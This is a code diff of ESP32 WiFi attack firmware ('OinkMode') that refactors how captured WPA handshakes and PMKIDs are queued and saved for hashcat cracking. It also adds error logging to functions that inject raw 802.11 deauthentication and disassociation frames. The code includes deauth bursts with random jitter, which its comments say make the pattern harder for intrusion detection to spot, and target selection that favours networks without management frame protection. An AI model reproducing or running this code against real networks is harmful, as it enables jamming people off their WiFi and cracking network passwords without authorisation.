-        if (hsIdx >= (int)handshakes.size()) {
-            NetworkRecon::exitCritical();
-            return;
-        }
-        
-        CapturedHandshake& hs = handshakes[hsIdx];
-        
-        // Store this frame (EAPOL payload for hashcat 22000)
-        uint8_t frameIdx = messageNum - 1;
-        uint16_t copyLen = min((uint16_t)512, len);
-        memcpy(hs.frames[frameIdx].data, payload, copyLen);
-        hs.frames[frameIdx].len = copyLen;
-        hs.frames[frameIdx].messageNum = messageNum;
-        hs.frames[frameIdx].timestamp = millis();
-        hs.frames[frameIdx].rssi = rssi;
-        
-        // Store full 802.11 frame for PCAP export (radiotap + WPA-SEC compatibility)
-        uint16_t fullCopyLen = min((uint16_t)300, fullFrameLen);
-        memcpy(hs.frames[frameIdx].fullFrame, fullFrame, fullCopyLen);
-        hs.frames[frameIdx].fullFrameLen = fullCopyLen;
-        
-        // Update mask
-        hs.capturedMask |= (1 << frameIdx);
-        hs.lastSeen = millis();
-        
-        // Look up SSID from networks if not set (already holding NetworkRecon critical section)
-        if (hs.ssid[0] == 0) {
-            for (int ni = 0; ni < (int)networks().size(); ni++) {
-                if (memcmp(networks()[ni].bssid, bssid, 6) == 0) {
-                    strncpy(hs.ssid, networks()[ni].ssid, 32);
-                    hs.ssid[32] = 0;
+                    if (allZeros) break;
+                    memcpy(pmkidBuf, pmkidData, 16);
+                    hasPMKID = true;
                     break;
                 }
             }
         }
-        
-        // Check completion and queue events
-        bool isComplete = hs.isComplete();
-        bool notSaved = !hs.saved;
-        char ssidCopy[33] = {0};
-        if (isComplete && notSaved) {
-            strncpy(ssidCopy, hs.ssid, 32);
+    }
+    
+    // Enqueue single EAPOL frame to deferred queue — Core 1 processes everything
+    {
+        taskENTER_CRITICAL(&oinkQueueMux);
+        if (pendingHsAllocated[pendingHsWrite]) {
+            taskEXIT_CRITICAL(&oinkQueueMux);
+            return;  // Pool full — drop frame (rare with 4 slots)
         }
+        PendingEAPOLFrame& slot = pendingHsPool[pendingHsWrite];
+        memcpy(slot.bssid, bssid, 6);
+        memcpy(slot.station, station, 6);
+        slot.messageNum = messageNum;
         
-        NetworkRecon::exitCritical();
+        // Copy EAPOL payload
+        uint16_t copyLen = min((uint16_t)512, len);
+        memcpy(slot.frame.data, payload, copyLen);
+        slot.frame.len = copyLen;
+        slot.frame.messageNum = messageNum;
+        slot.frame.timestamp = millis();
+        slot.frame.rssi = rssi;
         
-        // Queue mood/save events outside critical section
-        if (isComplete && notSaved) {
-            if (!pendingHandshakeComplete) {
-                strncpy(pendingHandshakeSSID, ssidCopy, 32);
-                pendingHandshakeSSID[32] = 0;
-                pendingHandshakeComplete = true;
-            }
-            pendingAutoSave = true;
+        // Copy full 802.11 frame for PCAP
+        uint16_t fullCopyLen = min((uint16_t)300, fullFrameLen);
+        memcpy(slot.frame.fullFrame, fullFrame, fullCopyLen);
+        slot.frame.fullFrameLen = fullCopyLen;
+        
+        // Store PMKID if extracted from M1
+        memcpy(slot.pmkid, pmkidBuf, 16);
+        slot.hasPMKID = hasPMKID;
+        
+        pendingHsAllocated[pendingHsWrite] = true;
+        pendingHsWrite = (pendingHsWrite + 1) % PENDING_HS_SLOTS;
+        taskEXIT_CRITICAL(&oinkQueueMux);
+    }
+    
+    // Queue mood/save events (volatile flag write — no vector access)
+    if (hasPMKID) {
+        if (!pendingPMKIDCapture) {
+            pendingPMKIDSSID[0] = 0;  // Core 1 dequeue fills from networks
+            pendingPMKIDCapture = true;
         }
-    } else {
-        // New handshake - enqueue to circular buffer for main thread
-        // Circular buffer allows queueing multiple rapid EAPOL frames (M1-M4 within ms)
-        
-        // Find or update existing slot for this handshake in the buffer
-        uint8_t targetSlot = PENDING_HS_SLOTS;  // Invalid slot marker
-        uint8_t writePos = pendingHsWrite;
-        
-        // Check if we already have a slot for this handshake (scan from read to write)
-        uint8_t scanPos = pendingHsRead;
-        while (scanPos != writePos) {
-            if (pendingHandshakes[scanPos] &&
-                memcmp(pendingHandshakes[scanPos]->bssid, bssid, 6) == 0 &&
-                memcmp(pendingHandshakes[scanPos]->station, station, 6) == 0) {
-                targetSlot = scanPos;
-                break;
-            }
-            scanPos = (scanPos + 1) % PENDING_HS_SLOTS;
-        }
-        
-        // If not found, try to allocate a new slot from static pool
-        if (targetSlot >= PENDING_HS_SLOTS) {
-            // Check if buffer is full (write pointer would catch read pointer)
-            uint8_t nextWrite = (writePos + 1) % PENDING_HS_SLOTS;
-            if (nextWrite != pendingHsRead && !pendingHsBusy[writePos] && !pendingHsAllocated[writePos]) {
-                // Slot is available - acquire from static pool (no heap ops)
-                targetSlot = writePos;
-                
-                // STATIC POOL: Point to pre-allocated slot (no malloc in callback context)
-                pendingHsAllocated[targetSlot] = true;
-                pendingHandshakes[targetSlot] = &pendingHsPool[targetSlot];
-                
-                pendingHsBusy[targetSlot] = true;  // Lock slot during init
-                
-                memcpy(pendingHandshakes[targetSlot]->bssid, bssid, 6);
-                memcpy(pendingHandshakes[targetSlot]->station, station, 6);
-                pendingHandshakes[targetSlot]->messageNum = 0;  // Deprecated field
-                pendingHandshakes[targetSlot]->capturedMask = 0;
-                pendingHandshakes[targetSlot]->hasPMKID = false;
-                
-                // Advance write pointer
-                pendingHsWrite = nextWrite;
-                
-                pendingHsBusy[targetSlot] = false;  // Unlock after init
-            }
-            // else: buffer full, drop this frame (extremely rare with 4 slots)
-        }
-        
-        // Store frame in target slot if we have one
-        if (targetSlot < PENDING_HS_SLOTS && pendingHandshakes[targetSlot] && !pendingHsBusy[targetSlot]) {
-            uint8_t frameIdx = messageNum - 1;
-            if (frameIdx < 4) {
-                pendingHsBusy[targetSlot] = true;  // Lock slot during update
-                
-                // EAPOL payload for hashcat 22000
-                uint16_t copyLen = min((uint16_t)512, len);
-                memcpy(pendingHandshakes[targetSlot]->frames[frameIdx].data, payload, copyLen);
-                pendingHandshakes[targetSlot]->frames[frameIdx].len = copyLen;
-                
-                // Full 802.11 frame for PCAP export
-                uint16_t fullCopyLen = min((uint16_t)300, fullFrameLen);
-                memcpy(pendingHandshakes[targetSlot]->frames[frameIdx].fullFrame, fullFrame, fullCopyLen);
-                pendingHandshakes[targetSlot]->frames[frameIdx].fullFrameLen = fullCopyLen;
-                pendingHandshakes[targetSlot]->frames[frameIdx].rssi = rssi;
-                
-                pendingHandshakes[targetSlot]->capturedMask |= (1 << frameIdx);
-                
-                pendingHsBusy[targetSlot] = false;  // Unlock after update
-            }
-        }
+        pendingAutoSave = true;
     }
 }
 
-int OinkMode::findOrCreateHandshake(const uint8_t* bssid, const uint8_t* station) {
-    // CALLBACK VERSION: Lookup only, no push_back
-    // If not found, returns -1 and caller must queue to pendingHandshakeCreate
-    NetworkRecon::enterCritical();
-    int result = -1;
-    for (int i = 0; i < (int)handshakes.size(); i++) {
-        if (memcmp(handshakes[i].bssid, bssid, 6) == 0 &&
-            memcmp(handshakes[i].station, station, 6) == 0) {
-            result = i;
-            break;
-        }
-    }
-    NetworkRecon::exitCritical();
-    return result;  // -1 means caller must queue for creation in main thread
-}
+// findOrCreateHandshake() and findOrCreatePMKID() REMOVED — callback is now a
+// PURE ENQUEUER (no vector access). Core 1 dequeue uses findOrCreateHandshakeSafe().
 
-int OinkMode::findOrCreatePMKID(const uint8_t* bssid, const uint8_t* station) {
-    // CALLBACK VERSION: Lookup only, no push_back
-    // If not found, returns -1 and caller must queue to pendingPMKIDCreate
-    NetworkRecon::enterCritical();
-    int result = -1;
-    for (int i = 0; i < (int)pmkids.size(); i++) {
-        if (memcmp(pmkids[i].bssid, bssid, 6) == 0 &&
-            memcmp(pmkids[i].station, station, 6) == 0) {
-            result = i;
-            break;
-        }
-    }
-    NetworkRecon::exitCritical();
-    return result;  // -1 means caller must queue for creation in main thread
-}
-
-// Safe versions for main thread use (does vector operations safely)
+// Safe versions for main thread use (Core 1 only — no spinlock needed since callback
+// never touches handshakes[]/pmkids[] vectors)
 int OinkMode::findOrCreateHandshakeSafe(const uint8_t* bssid, const uint8_t* station) {
-    // This version is ONLY called from update() in main loop context
-    // Still need spinlock to prevent race with callback reads
-    
-    NetworkRecon::enterCritical();
-    
+    // Core 1 only — callback never touches handshakes[], no spinlock needed
     // Look for existing
     for (int i = 0; i < (int)handshakes.size(); i++) {
         if (memcmp(handshakes[i].bssid, bssid, 6) == 0 &&
             memcmp(handshakes[i].station, station, 6) == 0) {
-            NetworkRecon::exitCritical();
             return i;
         }
     }
     
     // Limit check
-    if (handshakes.size() >= MAX_HANDSHAKES) {
-        NetworkRecon::exitCritical();
-        return -1;
-    }
+    if (handshakes.size() >= MAX_HANDSHAKES) return -1;
     // Pressure gate: block new handshakes at Warning+ (aggressive shedding)
-    if (HeapHealth::getPressureLevel() >= HeapPressureLevel::Warning) {
-        NetworkRecon::exitCritical();
-        return -1;
-    }
-    if (ESP.getFreeHeap() < HeapPolicy::kMinHeapForHandshakeAdd) {
-        NetworkRecon::exitCritical();
-        return -1;
-    }
+    if (HeapHealth::getPressureLevel() >= HeapPressureLevel::Warning) return -1;
+    if (ESP.getFreeHeap() < HeapPolicy::kMinHeapForHandshakeAdd) return -1;
     if (handshakes.size() >= handshakes.capacity()) {
-        if (ESP.getFreeHeap() < HeapPolicy::kMinHeapForHandshakeAdd) {
-            NetworkRecon::exitCritical();
-            return -1;
-        }
+        if (ESP.getFreeHeap() < HeapPolicy::kMinHeapForHandshakeAdd) return -1;
     }
     
     // Create new entry
@@ -2092,45 +1874,29 @@ int OinkMode::findOrCreateHandshakeSafe(const uint8_t* bssid, const uint8_t* sta
             free(hs.beaconData);
             hs.beaconData = nullptr;
         }
-        NetworkRecon::exitCritical();
         SDLog::log("OINK", "Failed to create handshake: out of memory");
         return -1;
     }
     int idx = handshakes.size() - 1;
-    NetworkRecon::exitCritical();
     return idx;
 }
 
 int OinkMode::findOrCreatePMKIDSafe(const uint8_t* bssid, const uint8_t* station) {
-    // This version is ONLY called from update() in main loop context
-    // Still need spinlock to prevent race with callback reads
-    
-    NetworkRecon::enterCritical();
-    
+    // Core 1 only — callback never touches pmkids[], no spinlock needed
     // Look for existing
     for (int i = 0; i < (int)pmkids.size(); i++) {
         if (memcmp(pmkids[i].bssid, bssid, 6) == 0 &&
             memcmp(pmkids[i].station, station, 6) == 0) {
-            NetworkRecon::exitCritical();
             return i;
         }
     }
     
     // Limit check
-    if (pmkids.size() >= MAX_PMKIDS) {
-        NetworkRecon::exitCritical();
-        return -1;
-    }
+    if (pmkids.size() >= MAX_PMKIDS) return -1;
     // Pressure gate: block new PMKIDs at Warning+ (aggressive shedding)
-    if (HeapHealth::getPressureLevel() >= HeapPressureLevel::Warning) {
-        NetworkRecon::exitCritical();
-        return -1;
-    }
+    if (HeapHealth::getPressureLevel() >= HeapPressureLevel::Warning) return -1;
     if (pmkids.size() >= pmkids.capacity()) {
-        if (ESP.getFreeHeap() < HeapPolicy::kMinHeapForOinkNetworkAdd) {
-            NetworkRecon::exitCritical();
-            return -1;
-        }
+        if (ESP.getFreeHeap() < HeapPolicy::kMinHeapForOinkNetworkAdd) return -1;
     }
     
     // Create new entry
@@ -2139,17 +1905,15 @@ int OinkMode::findOrCreatePMKIDSafe(const uint8_t* bssid, const uint8_t* station
     memcpy(p.station, station, 6);
     p.timestamp = millis();
     p.saved = false;
-    p.saveAttempts = 0;  // Start with no attempts
+    p.saveAttempts = 0;
     
     try {
         pmkids.push_back(p);
     } catch (const std::bad_alloc&) {
-        NetworkRecon::exitCritical();
         SDLog::log("OINK", "Failed to create PMKID: out of memory");
         return -1;
     }
     int idx = pmkids.size() - 1;
-    NetworkRecon::exitCritical();
     return idx;
 }
 
@@ -2209,14 +1973,10 @@ void OinkMode::autoSaveCheck() {
         return;  // Nothing to save, skip promiscuous pause
     }
     
-    // Pause promiscuous mode for safe SD access (avoids SPI bus contention)
-    // Brief ~50-100ms gap is acceptable - we just captured what we needed
-    bool pausedByUs = false;
-    if (NetworkRecon::isRunning()) {
-        NetworkRecon::pause();
-        pausedByUs = true;
-    }
-    delay(5);  // Let SPI bus settle
+    // NOTE: No need to pause promiscuous mode for SD writes.
+    // Promiscuous uses WiFi radio, SD uses SPI — completely separate hardware.
+    // The oinkBusy flag in the callback already prevents concurrent access to handshakes.
+    // Previously pausing here caused 100% TG1WDT crash on resume (WiFi driver state corruption).
     
     // Save any unsaved complete handshakes
     for (auto& hs : handshakes) {
@@ -2273,11 +2033,6 @@ void OinkMode::autoSaveCheck() {
     
     // Also save any unsaved PMKIDs
     saveAllPMKIDs();
-    
-    // Resume promiscuous mode if we paused it
-    if (pausedByUs) {
-        NetworkRecon::resume();
-    }
 }
 
 // PCAP file format structures
@@ -2662,29 +2417,37 @@ bool OinkMode::saveAllPMKIDs() {
 }
 
 void OinkMode::sendDeauthFrame(const uint8_t* bssid, const uint8_t* station, uint8_t reason) {
-    // Deauth frame structure
     uint8_t deauthPacket[26] = {
-        0xC0, 0x00,  // Frame Control: Deauth
-        0x00, 0x00,  // Duration
-        // Address 1 (Destination)
+        0xC0, 0x00, 0x00, 0x00,
         0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-        // Address 2 (Source/BSSID)
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-        // Address 3 (BSSID)
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-        0x00, 0x00,  // Sequence
-        0x07, 0x00   // Reason code
+        0x00, 0x00, 0x07, 0x00
     };
-    
     memcpy(deauthPacket + 4, station, 6);
     memcpy(deauthPacket + 10, bssid, 6);
     memcpy(deauthPacket + 16, bssid, 6);
     deauthPacket[24] = reason;
-    
-    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
+    if (err != ESP_OK) {
+        deauthTxErrors++;
+        if (deauthTxErrors <= 5 || (deauthTxErrors % 50 == 0)) {
+            uint8_t ch = 0;
+            wifi_second_chan_t secondCh = WIFI_SECOND_CHAN_NONE;
+            esp_wifi_get_channel(&ch, &secondCh);
+            Serial.printf("[OINK] TX ERR %d (total=%lu) ch=%d bssid=%02X:%02X:%02X:%02X:%02X:%02X\r\n",
+                (int)err, deauthTxErrors, (int)ch,
+                bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
+        }
+    } else {
+        deauthTxOk++;
+    }
 }
 
 void OinkMode::sendDeauthBurst(const uint8_t* bssid, const uint8_t* station, uint8_t count) {
+    // Guard: skip TX if WiFi driver not ready (prevents TG1WDT after resume)
+    if (!NetworkRecon::canSendFramesNow()) return;
+
     // Send burst of deauth frames for more effective disconnection
     // Random jitter between frames makes it harder for WIDS to detect pattern
     // Jitter is modified by buffs/debuffs (base 5ms, debuffed 7ms)
@@ -2716,7 +2479,10 @@ void OinkMode::sendDeauthBurst(const uint8_t* bssid, const uint8_t* station, uin
             reversePacket[23] = 0x00;
             reversePacket[24] = 1;  // Unspecified reason
             reversePacket[25] = 0x00;
-            esp_wifi_80211_tx(WIFI_IF_STA, reversePacket, sizeof(reversePacket), false);
+            esp_err_t rev_err = esp_wifi_80211_tx(WIFI_IF_STA, reversePacket, sizeof(reversePacket), false);
+            if (rev_err != ESP_OK) {
+                deauthTxErrors++;
+            }
             
             // Jitter between iterations (buff-modified)
             // CRITICAL FIX: Use yield() on longer jitters to prevent WDT reset
@@ -2753,8 +2519,10 @@ void OinkMode::sendDisassocFrame(const uint8_t* bssid, const uint8_t* station, u
     memcpy(disassocPacket + 10, bssid, 6);
     memcpy(disassocPacket + 16, bssid, 6);
     disassocPacket[24] = reason;
-    
-    esp_wifi_80211_tx(WIFI_IF_STA, disassocPacket, sizeof(disassocPacket), false);
+    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, disassocPacket, sizeof(disassocPacket), false);
+    if (err != ESP_OK) {
+        deauthTxErrors++;
+    }
 }
 
 void OinkMode::sendAssociationRequest(const uint8_t* bssid, const char* ssid, uint8_t ssidLen) {
@@ -3137,21 +2905,6 @@ int OinkMode::getNextTarget() {
     int bestRecentScore = -100000;
 
     NetworkRecon::enterCritical();
-    
-    // #region agent log - H3 PMF detection check
-    {
-        static uint32_t lastTargetLog = 0;
-        if (now - lastTargetLog > 2000) {
-            lastTargetLog = now;
-            int pmfCount = 0, validCount = 0, totalCount = (int)networks().size();
-            for (int i = 0; i < totalCount && i < 10; i++) {
-                if (networks()[i].hasPMF) pmfCount++;
-                if (!networks()[i].hasPMF && !networks()[i].hasHandshake && networks()[i].authmode != WIFI_AUTH_OPEN && networks()[i].ssid[0] != 0) validCount++;
-            }
-            Serial.printf("[DBG-H3] getNextTarget total=%d pmf=%d valid=%d\r\n", totalCount, pmfCount, validCount);
-        }
-    }
-    // #endregion
 
     for (int i = 0; i < (int)networks().size(); i++) {
         const DetectedNetwork& net = networks()[i];
